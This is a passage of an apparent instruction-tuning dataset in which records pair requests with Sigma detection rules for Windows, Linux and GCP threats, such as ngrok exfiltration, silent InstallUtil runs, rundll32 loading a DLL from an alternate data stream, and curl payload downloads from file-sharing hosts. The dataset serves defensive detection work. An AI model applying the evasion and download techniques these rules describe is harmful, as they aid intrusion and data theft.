    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        DestinationHostname|contains:\n            - 'tunnel.us.ngrok.com'\n            - 'tunnel.eu.ngrok.com'\n            - 'tunnel.ap.ngrok.com'\n            - 'tunnel.au.ngrok.com'\n            - 'tunnel.sa.ngrok.com'\n            - 'tunnel.jp.ngrok.com'\n            - 'tunnel.in.ngrok.com'\n    condition: selection\nfalsepositives:\n    - Legitimate use of ngrok\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        DestinationHostname|contains:\n            - 'tunnel.us.ngrok.com'\n            - 'tunnel.eu.ngrok.com'\n            - 'tunnel.ap.ngrok.com'\n            - 'tunnel.au.ngrok.com'\n            - 'tunnel.sa.ngrok.com'\n            - 'tunnel.jp.ngrok.com'\n            - 'tunnel.in.ngrok.com'\n    condition: selection\nfalsepositives:\n    - Legitimate use of ngrok\nlevel: high\n",
      "question": "an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors",
      "answer": "In order to detect an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors, you should: Monitor network connections on Windows systems for communications with specific ngrok tunneling endpoint hostnames. These hostnames include 'tunnel.us.ngrok.com', 'tunnel.eu.ngrok.com', 'tunnel.ap.ngrok.com', 'tunnel.au.ngrok.com', 'tunnel.sa.ngrok.com', 'tunnel.jp.ngrok.com', and 'tunnel.in.ngrok.com'. When such activity is detected, it may indicate an attempt at unauthorized data exfiltration. However, bear in mind that there could be legitimate uses of ngrok, so each detection should be investigated to confirm malicious activity. This activity is considered of high importance due to the potential for it to indicate data being exfiltrated by malicious actors, bypassing usual data transmission safeguards."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of \"reg.exe\" commands with the \"delete\" flag on services registry key. Often used by attacker to remove AV software services.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of \"reg.exe\" commands with the \"delete\" flag on services registry key, often used by attackers to remove antivirus software services, you should monitor process creation logs on Windows systems for the execution of \"reg.exe\". Specifically, look for occurrences where the process image ends with 'reg.exe' or the original file name matches 'reg.exe'. It is critical to pay attention to commands that contain the 'delete' keyword, especially when these commands are modifying keys within the '\\SYSTEM\\CurrentControlSet\\services\\' path in the registry. This path is significant because it is where service configurations are stored, and modifying it could suggest attempts to disable or remove software, particularly security services. This detection mechanism is considered to have a high level of importance due to the unlikely event of false positives, indicating that legitimate usage of such commands in this context is rare.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: 'reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_delete:\n        CommandLine|contains: ' delete '\n    selection_key:\n        # Add specific services if you would like the rule to be more specific\n        CommandLine|contains: '\\SYSTEM\\CurrentControlSet\\services\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: 'reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_delete:\n        CommandLine|contains: ' delete '\n    selection_key:\n        # Add specific services if you would like the rule to be more specific\n        CommandLine|contains: '\\SYSTEM\\CurrentControlSet\\services\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "execution of \"reg.exe\" commands with the \"delete\" flag on services registry key. Often used by attacker to remove AV software services",
      "answer": "In order to detect execution of \"reg.exe\" commands with the \"delete\" flag on services registry key, often used by attackers to remove antivirus software services, you should monitor process creation logs on Windows systems for the execution of \"reg.exe\". Specifically, look for occurrences where the process image ends with 'reg.exe' or the original file name matches 'reg.exe'. It is critical to pay attention to commands that contain the 'delete' keyword, especially when these commands are modifying keys within the '\\SYSTEM\\CurrentControlSet\\services\\' path in the registry. This path is significant because it is where service configurations are stored, and modifying it could suggest attempts to disable or remove software, particularly security services. This detection mechanism is considered to have a high level of importance due to the unlikely event of false positives, indicating that legitimate usage of such commands in this context is rare."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting remote RPC calls to read information about scheduled tasks.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect remote RPC calls to read information about scheduled tasks, you should focus on monitoring events generated by the RPC Firewall, specifically tailored around application processes. Make sure the RPC Firewall is installed and properly configured on all relevant processes, with auditing enabled and actions set to block, identified by the unique identifier \"uuid:86d35949-83c9-4044-b424-db363231fd0c\".\n\nPay close attention to the RPC Firewall event logs (EventLog: RPCFW), especially looking for events with an EventID of 3, which is indicative of remote procedure call attempts that need to be scrutinized. These calls are further identified by matching the InterfaceUuid \"86d35949-83c9-4044-b424-db363231fd0c\", ensuring that the detection is accurately targeting the specific activity related to scheduled tasks inquiries.\n\nHowever, it's crucial to apply a filter to exclude certain operation numbers (OpNum) from triggering false alerts. These operation numbers include 1, 3, 4, 10, 11, 12, 13, 14, and 15, as their invocation might not necessarily be malicious and could result in unnecessary false positives. The effective detection strategy, therefore, involves identifying relevant RPC calls while actively filtering out these specified operations, ensuring a focus on genuinely suspicious activities.\n\nBear in mind, there might be unknown cases that could lead to false positives, indicating the importance of continuous monitoring and adjustment of the detection strategy to maintain its accuracy and effectiveness. This approach targets a high level of threat detection, underlining the severity and potential impact of unauthorized access to scheduled tasks information via remote RPC calls.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: rpc_firewall\n    category: application\n    definition: 'Requirements: install and apply the RPC Firewall to all processes with \"audit:true action:block uuid:86d35949-83c9-4044-b424-db363231fd0c\"'\ndetection:\n    selection:\n        EventLog: RPCFW\n        EventID: 3\n        InterfaceUuid: 86d35949-83c9-4044-b424-db363231fd0c\n    filter:\n        OpNum:\n            - 1\n            - 3\n            - 4\n            - 10\n            - 11\n            - 12\n            - 13\n            - 14\n            - 15\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: rpc_firewall\n    category: application\n    definition: 'Requirements: install and apply the RPC Firewall to all processes with \"audit:true action:block uuid:86d35949-83c9-4044-b424-db363231fd0c\"'\ndetection:\n    selection:\n        EventLog: RPCFW\n        EventID: 3\n        InterfaceUuid: 86d35949-83c9-4044-b424-db363231fd0c\n    filter:\n        OpNum:\n            - 1\n            - 3\n            - 4\n            - 10\n            - 11\n            - 12\n            - 13\n            - 14\n            - 15\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "remote RPC calls to read information about scheduled tasks",
      "answer": "In order to detect remote RPC calls to read information about scheduled tasks, you should focus on monitoring events generated by the RPC Firewall, specifically tailored around application processes. Make sure the RPC Firewall is installed and properly configured on all relevant processes, with auditing enabled and actions set to block, identified by the unique identifier \"uuid:86d35949-83c9-4044-b424-db363231fd0c\".\n\nPay close attention to the RPC Firewall event logs (EventLog: RPCFW), especially looking for events with an EventID of 3, which is indicative of remote procedure call attempts that need to be scrutinized. These calls are further identified by matching the InterfaceUuid \"86d35949-83c9-4044-b424-db363231fd0c\", ensuring that the detection is accurately targeting the specific activity related to scheduled tasks inquiries.\n\nHowever, it's crucial to apply a filter to exclude certain operation numbers (OpNum) from triggering false alerts. These operation numbers include 1, 3, 4, 10, 11, 12, 13, 14, and 15, as their invocation might not necessarily be malicious and could result in unnecessary false positives. The effective detection strategy, therefore, involves identifying relevant RPC calls while actively filtering out these specified operations, ensuring a focus on genuinely suspicious activities.\n\nBear in mind, there might be unknown cases that could lead to false positives, indicating the importance of continuous monitoring and adjustment of the detection strategy to maintain its accuracy and effectiveness. This approach targets a high level of threat detection, underlining the severity and potential impact of unauthorized access to scheduled tasks information via remote RPC calls."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of Remote Utilities RAT (RURAT) from an unusual location (outside of 'C:\\Program Files').\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of Remote Utilities RAT (RURAT) from an unusual location (outside of 'C:\\Program Files'), you should focus on monitoring process creation events on Windows systems. Look for processes that are initiated from executable files named 'rutserv.exe' or 'rfusclient.exe', which are associated with the Remote Utilities software. Additionally, check if the 'Product' attribute in the event logs matches 'Remote Utilities'. It's crucial to differentiate between legitimate and suspicious activities by excluding events where these processes start from the standard installation paths, namely 'C:\\Program Files\\Remote Utilities' and 'C:\\Program Files (x86)\\Remote Utilities'. By applying this monitoring strategy, any process creation event that matches these criteria but does not originate from the expected directories should be considered as a potential indicator of a Remote Utilities RAT being executed from an unusual location, which might suggest a malicious usage. This detection is categorized with a medium level of confidence due to the possibility of unknown false positives, indicating that while the criteria are specific, there may be legitimate scenarios that could inadvertently meet these conditions. This approach is designed to combat tactics and techniques like execution of malware and use of remote access tools by unauthorized entities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n            - '\\rutserv.exe'\n            - '\\rfusclient.exe'\n        - Product: 'Remote Utilities'\n    filter:\n        Image|startswith:\n            - 'C:\\Program Files\\Remote Utilities'\n            - 'C:\\Program Files (x86)\\Remote Utilities'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n            - '\\rutserv.exe'\n            - '\\rfusclient.exe'\n        - Product: 'Remote Utilities'\n    filter:\n        Image|startswith:\n            - 'C:\\Program Files\\Remote Utilities'\n            - 'C:\\Program Files (x86)\\Remote Utilities'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of Remote Utilities RAT (RURAT) from an unusual location (outside of 'C:\\Program Files')",
      "answer": "In order to detect execution of Remote Utilities RAT (RURAT) from an unusual location (outside of 'C:\\Program Files'), you should focus on monitoring process creation events on Windows systems. Look for processes that are initiated from executable files named 'rutserv.exe' or 'rfusclient.exe', which are associated with the Remote Utilities software. Additionally, check if the 'Product' attribute in the event logs matches 'Remote Utilities'. It's crucial to differentiate between legitimate and suspicious activities by excluding events where these processes start from the standard installation paths, namely 'C:\\Program Files\\Remote Utilities' and 'C:\\Program Files (x86)\\Remote Utilities'. By applying this monitoring strategy, any process creation event that matches these criteria but does not originate from the expected directories should be considered as a potential indicator of a Remote Utilities RAT being executed from an unusual location, which might suggest a malicious usage. This detection is categorized with a medium level of confidence due to the possibility of unknown false positives, indicating that while the criteria are specific, there may be legitimate scenarios that could inadvertently meet these conditions. This approach is designed to combat tactics and techniques like execution of malware and use of remote access tools by unauthorized entities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious session with two users present.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious sessions with two users present, you should focus on monitoring logs from Linux systems, specifically those that pertain to the Guacamole service. The detection mechanism hinges on the identification of logs that explicitly mention \"2 users now present.\" This phrase serves as a key indicator that a session may be compromised or suspicious due to the presence of an unexpected additional user. Since Guacamole is often employed for remote desktop access, any indication of an unexpected second user could suggest a security breach or an unauthorized access attempt.\n\nIt's vital to note that the detection strategy is classified with a high level of importance, suggesting such occurrences are taken seriously and should be investigated promptly. However, due to the broad and somewhat unspecified nature of this detection method, it is acknowledged that there might be unknown false positives. This means that while alerts generated from this detection method require investigation, not all will necessarily correlate with malicious activity. The vigilance in monitoring and analyzing Guacamole service logs for the mentioned phrase will be a critical step in identifying potential breaches attempting to utilize or exploit remote access services in a Linux environment.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: guacamole\ndetection:\n    selection:\n        - '(2 users now present)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: guacamole\ndetection:\n    selection:\n        - '(2 users now present)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious session with two users present",
      "answer": "In order to detect suspicious sessions with two users present, you should focus on monitoring logs from Linux systems, specifically those that pertain to the Guacamole service. The detection mechanism hinges on the identification of logs that explicitly mention \"2 users now present.\" This phrase serves as a key indicator that a session may be compromised or suspicious due to the presence of an unexpected additional user. Since Guacamole is often employed for remote desktop access, any indication of an unexpected second user could suggest a security breach or an unauthorized access attempt.\n\nIt's vital to note that the detection strategy is classified with a high level of importance, suggesting such occurrences are taken seriously and should be investigated promptly. However, due to the broad and somewhat unspecified nature of this detection method, it is acknowledged that there might be unknown false positives. This means that while alerts generated from this detection method require investigation, not all will necessarily correlate with malicious activity. The vigilance in monitoring and analyzing Guacamole service logs for the mentioned phrase will be a critical step in identifying potential breaches attempting to utilize or exploit remote access services in a Linux environment."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Uses the .NET InstallUtil.exe application in order to execute image without log.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to use the .NET InstallUtil.exe application in order to execute image without log, you should monitor the creation of processes on Windows systems for any instances where the process Image path ends with '\\InstallUtil.exe' and contains 'Microsoft.NET\\Framework' in its path. Furthermore, it's crucial to check if the command line arguments include both '/logfile= ' (indicating an attempt to avoid logging to a file) and '/LogToConsole=false' (aiming to suppress console output). This monitoring can help identify suspicious use of InstallUtil.exe, which could be indicative of an attempt to execute code stealthily. The detection of such activities is of medium importance and could potentially represent an effort to bypass conventional execution methods while avoiding detection through logging mechanisms.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\InstallUtil.exe'\n        Image|contains: 'Microsoft.NET\\Framework'\n        CommandLine|contains|all:\n            - '/logfile= '\n            - '/LogToConsole=false'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\InstallUtil.exe'\n        Image|contains: 'Microsoft.NET\\Framework'\n        CommandLine|contains|all:\n            - '/logfile= '\n            - '/LogToConsole=false'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Uses the .NET InstallUtil.exe application in order to execute image without log",
      "answer": "In order to use the .NET InstallUtil.exe application in order to execute image without log, you should monitor the creation of processes on Windows systems for any instances where the process Image path ends with '\\InstallUtil.exe' and contains 'Microsoft.NET\\Framework' in its path. Furthermore, it's crucial to check if the command line arguments include both '/logfile= ' (indicating an attempt to avoid logging to a file) and '/LogToConsole=false' (aiming to suppress console output). This monitoring can help identify suspicious use of InstallUtil.exe, which could be indicative of an attempt to execute code stealthily. The detection of such activities is of medium importance and could potentially represent an effort to bypass conventional execution methods while avoiding detection through logging mechanisms."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of rundll32 where the DLL being called is stored in an Alternate Data Stream (ADS)..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of rundll32 where the DLL being called is stored in an Alternate Data Stream (ADS), you should: Focus on monitoring process creation events within Windows environments. Specifically, keep an eye out for instances where the process image ends with '\\rundll32.exe' or the original file name is identified as 'RUNDLL32.EXE'. Additionally, pay close attention to the command line used for execution. Look for patterns that match the execution of 'rundll32' (case insensitive) followed by a space, then a path that includes a colon, indicating the potential use of an Alternate Data Stream. This pattern is crucial as it signifies the DLL being called from within an ADS, which is a common technique used by attackers to hide malicious activities. Be aware that this rule may yield unknown false positives, indicating that while it is set to a high alert level, each alert should still be investigated to confirm its validity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        # Example:\n        #   rundll32 \"C:\\ads\\file.txt:ADSDLL.dll\",DllMain\n        # Note: This doesn't cover the use case where a full path for the DLL isn't used. As it requires a more expensive regex\n        CommandLine|re: '[Rr][Uu][Nn][Dd][Ll][Ll]32(\\.[Ee][Xx][Ee])? \\S+?\\w:\\S+?:'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        # Example:\n        #   rundll32 \"C:\\ads\\file.txt:ADSDLL.dll\",DllMain\n        # Note: This doesn't cover the use case where a full path for the DLL isn't used. As it requires a more expensive regex\n        CommandLine|re: '[Rr][Uu][Nn][Dd][Ll][Ll]32(\\.[Ee][Xx][Ee])? \\S+?\\w:\\S+?:'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "execution of rundll32 where the DLL being called is stored in an Alternate Data Stream (ADS).",
      "answer": "In order to detect execution of rundll32 where the DLL being called is stored in an Alternate Data Stream (ADS), you should: Focus on monitoring process creation events within Windows environments. Specifically, keep an eye out for instances where the process image ends with '\\rundll32.exe' or the original file name is identified as 'RUNDLL32.EXE'. Additionally, pay close attention to the command line used for execution. Look for patterns that match the execution of 'rundll32' (case insensitive) followed by a space, then a path that includes a colon, indicating the potential use of an Alternate Data Stream. This pattern is crucial as it signifies the DLL being called from within an ADS, which is a common technique used by attackers to hide malicious activities. Be aware that this rule may yield unknown false positives, indicating that while it is set to a high alert level, each alert should still be investigated to confirm its validity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting registry value with specific intentional typo and strings seen used by the Small Sieve malware.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect registry value with specific intentional typo and strings seen used by the Small Sieve malware, you should: Focus on the Windows operating system's registry settings, particularly those modifications categorized under registry settings. Essential to this detection strategy is monitoring for events where registry values are being set, especially paying attention to changes within the '\\Microsoft\\Windows\\CurrentVersion\\Run\\' registry path. This path is critical because it's often used by malware to achieve persistence by ensuring the malicious software starts every time the system boots. The detection should specifically look for two distinct indicators of compromise. First, watch for registry values being created or modified with the deliberate typo \"Microsift,\" a tactic used to evade simple keyword detection mechanisms while mimicking legitimate Microsoft products. Second, identify registry values associated with executable files, especially those containing the string '.exe Platypus.' This particular string suggests the manipulation of registry values to execute malware specifically identified as the Small Sieve through its distinctive naming convention. It is imperative to treat every detection at this level with high importance due to the low likelihood of false positives, indicating a high confidence that such detections are indeed malicious activities rather than benign system or user actions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection_path:\n        EventType: SetValue\n        TargetObject|contains: '\\Microsoft\\Windows\\CurrentVersion\\Run\\'\n    selection_value:\n        - TargetObject|contains: 'Microsift'\n        - Details|contains: '.exe Platypus'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection_path:\n        EventType: SetValue\n        TargetObject|contains: '\\Microsoft\\Windows\\CurrentVersion\\Run\\'\n    selection_value:\n        - TargetObject|contains: 'Microsift'\n        - Details|contains: '.exe Platypus'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "registry value with specific intentional typo and strings seen used by the Small Sieve malware",
      "answer": "In order to detect registry value with specific intentional typo and strings seen used by the Small Sieve malware, you should: Focus on the Windows operating system's registry settings, particularly those modifications categorized under registry settings. Essential to this detection strategy is monitoring for events where registry values are being set, especially paying attention to changes within the '\\Microsoft\\Windows\\CurrentVersion\\Run\\' registry path. This path is critical because it's often used by malware to achieve persistence by ensuring the malicious software starts every time the system boots. The detection should specifically look for two distinct indicators of compromise. First, watch for registry values being created or modified with the deliberate typo \"Microsift,\" a tactic used to evade simple keyword detection mechanisms while mimicking legitimate Microsoft products. Second, identify registry values associated with executable files, especially those containing the string '.exe Platypus.' This particular string suggests the manipulation of registry values to execute malware specifically identified as the Small Sieve through its distinctive naming convention. It is imperative to treat every detection at this level with high importance due to the low likelihood of false positives, indicating a high confidence that such detections are indeed malicious activities rather than benign system or user actions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when storage bucket is modified or deleted in Google Cloud..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a storage bucket is modified or deleted in Google Cloud, you should monitor audit logs within the Google Cloud Platform (GCP) environment, focusing specifically on the GCP audit logging service. This involves looking for instances when methods related to storage buckets, such as `storage.buckets.delete`, `storage.buckets.insert`, `storage.buckets.update`, or `storage.buckets.patch`, are invoked. Activities captured by these methods can indicate that storage buckets are either being created, deleted, updated, or patched.\n\nIt is crucial to assess these actions cautiously as changes to storage buckets may sometimes be legitimate activities conducted by system administrators. Verification processes should include checking that the user identity performing these actions, the user agent used, and the hostname involved are recognized and authorized to make such changes in your Google Cloud environment. In scenarios where modifications or deletions of storage buckets arise from unfamiliar users or sources, these should be subjected to investigation to determine their legitimacy. In cases where known behavior is identified as causing false positives \u2014 that is, legitimate activities being flagged as suspicious \u2014 these can be configured to be exempt from triggering alerts.\n\nUltimately, monitoring for these specific operations concerning storage buckets helps in identifying potential security breaches or unauthorized changes, aligning with best practices in maintaining the integrity and security of data stored in the Google Cloud. This vigilant approach towards monitoring and verifying storage bucket operations within the GCP's audit logging infrastructure aids in the early detection and mitigation of possible threats to cloud-based storage resources.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: gcp\n    service: gcp.audit\ndetection:\n    selection:\n        gcp.audit.method_name:\n            - storage.buckets.delete\n            - storage.buckets.insert\n            - storage.buckets.update\n            - storage.buckets.patch\n    condition: selection\nfalsepositives:\n    - Storage Buckets being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Storage Buckets modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: gcp\n    service: gcp.audit\ndetection:\n    selection:\n        gcp.audit.method_name:\n            - storage.buckets.delete\n            - storage.buckets.insert\n            - storage.buckets.update\n            - storage.buckets.patch\n    condition: selection\nfalsepositives:\n    - Storage Buckets being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Storage Buckets modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
      "question": "when storage bucket is modified or deleted in Google Cloud.",
      "answer": "In order to detect when a storage bucket is modified or deleted in Google Cloud, you should monitor audit logs within the Google Cloud Platform (GCP) environment, focusing specifically on the GCP audit logging service. This involves looking for instances when methods related to storage buckets, such as `storage.buckets.delete`, `storage.buckets.insert`, `storage.buckets.update`, or `storage.buckets.patch`, are invoked. Activities captured by these methods can indicate that storage buckets are either being created, deleted, updated, or patched.\n\nIt is crucial to assess these actions cautiously as changes to storage buckets may sometimes be legitimate activities conducted by system administrators. Verification processes should include checking that the user identity performing these actions, the user agent used, and the hostname involved are recognized and authorized to make such changes in your Google Cloud environment. In scenarios where modifications or deletions of storage buckets arise from unfamiliar users or sources, these should be subjected to investigation to determine their legitimacy. In cases where known behavior is identified as causing false positives \u2014 that is, legitimate activities being flagged as suspicious \u2014 these can be configured to be exempt from triggering alerts.\n\nUltimately, monitoring for these specific operations concerning storage buckets helps in identifying potential security breaches or unauthorized changes, aligning with best practices in maintaining the integrity and security of data stored in the Google Cloud. This vigilant approach towards monitoring and verifying storage bucket operations within the GCP's audit logging infrastructure aids in the early detection and mitigation of possible threats to cloud-based storage resources."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting file download using curl.exe.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect file download using curl.exe, you should monitor Windows process creation logs for instances where `curl.exe` is executed. Look for command line usage of `curl.exe` that includes accessing URLs directly through IP addresses or referencing commonly used file-sharing or pasting services such as anonfiles.com, cdn.discordapp.com/attachments/, ddns.net, and several others including mediafire.com, mega.nz, pastebin.com, etc. Specifically, track the use of command lines containing 'http' indicating that HTTP protocol is being used for the file transfer. \n\nPay close attention to command lines that include flags like '-O', '--remote-name', or '--output', which are used in curl commands to save the downloaded file with a specific name or in a specific location. Further, be alert for command lines ending with file extensions such as '.ps1', '.bat', '.exe', '.vbs', '.vbe', '.hta', '.dll', and '.psm1', which indicate the types of files being downloaded. These can include scripts, executables, and libraries, which could be indicative of malicious activity if they are being sourced from untrusted or suspicious sites. \n\nIf all these conditions are met, it's indicative of a high chance that a file download is occurring using curl.exe which could be malicious in nature. It\u2019s essential to monitor these activities as they align with tactics and techniques associated with the delivery and execution of potential malicious payloads.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_websites:\n        - CommandLine|re: '://[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'\n        - CommandLine|contains:\n            - 'anonfiles.com'\n            - 'cdn.discordapp.com/attachments/'\n            - 'ddns.net'\n            - 'ghostbin.co/'\n            - 'gist.githubusercontent.com'\n            - 'hastebin.com'\n            - 'mediafire.com'\n            - 'mega.nz'\n            - 'paste.ee'\n            - 'pastebin.com'\n            - 'pastebin.pl'\n            - 'pastetext.net'\n            - 'privatlab.com'\n            - 'privatlab.net'\n            - 'raw.githubusercontent.com'\n            - 'send.exploit.in'\n            - 'sendspace.com'\n            - 'storage.googleapis.com'\n            - 'temp.sh'\n            - 'transfer.sh'\n            - 'ufile.io'\n    selection_http:\n        CommandLine|contains: 'http'\n    selection_flag:\n        CommandLine|contains:\n            - ' -O'  # covers the alias for --remote-name and --output\n            - '--remote-name'\n            - '--output'\n    selection_ext:\n        CommandLine|endswith:\n            - \".ps1\"\n            - \".ps1'\"\n            - '.ps1\"'\n            - \".bat\"\n            - \".bat'\"\n            - '.bat\"'\n            - \".exe\"\n            - \".exe'\"\n            - '.exe\"'\n            - \".vbs\"\n            - \".vbs'\"\n            - '.vbs\"'\n            - \".vbe\"\n            - \".vbe'\"\n            - '.vbe\"'\n            - \".hta\"\n            - \".hta'\"\n            - '.hta\"'\n            - \".dll\"\n            - \".dll'\"\n            - '.dll\"'\n            - \".psm1\"\n            - \".psm1'\"\n            - '.psm1\"'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_websites:\n        - CommandLine|re: '://[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'\n        - CommandLine|contains:\n            - 'anonfiles.com'\n            - 'cdn.discordapp.com/attachments/'\n            - 'ddns.net'\n            - 'ghostbin.co/'\n            - 'gist.githubusercontent.com'\n            - 'hastebin.com'\n            - 'mediafire.com'\n            - 'mega.nz'\n            - 'paste.ee'\n            - 'pastebin.com'\n            - 'pastebin.pl'\n            - 'pastetext.net'\n            - 'privatlab.com'\n            - 'privatlab.net'\n            - 'raw.githubusercontent.com'\n            - 'send.exploit.in'\n            - 'sendspace.com'\n            - 'storage.googleapis.com'\n            - 'temp.sh'\n            - 'transfer.sh'\n            - 'ufile.io'\n    selection_http:\n        CommandLine|contains: 'http'\n    selection_flag:\n        CommandLine|contains:\n            - ' -O'  # covers the alias for --remote-name and --output\n            - '--remote-name'\n            - '--output'\n    selection_ext:\n        CommandLine|endswith:\n            - \".ps1\"\n            - \".ps1'\"\n            - '.ps1\"'\n            - \".bat\"\n            - \".bat'\"\n            - '.bat\"'\n            - \".exe\"\n            - \".exe'\"\n            - '.exe\"'\n            - \".vbs\"\n            - \".vbs'\"\n            - '.vbs\"'\n            - \".vbe\"\n            - \".vbe'\"\n            - '.vbe\"'\n            - \".hta\"\n            - \".hta'\"\n            - '.hta\"'\n            - \".dll\"\n            - \".dll'\"\n            - '.dll\"'\n            - \".psm1\"\n            - \".psm1'\"\n            - '.psm1\"'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "file download using curl.exe",
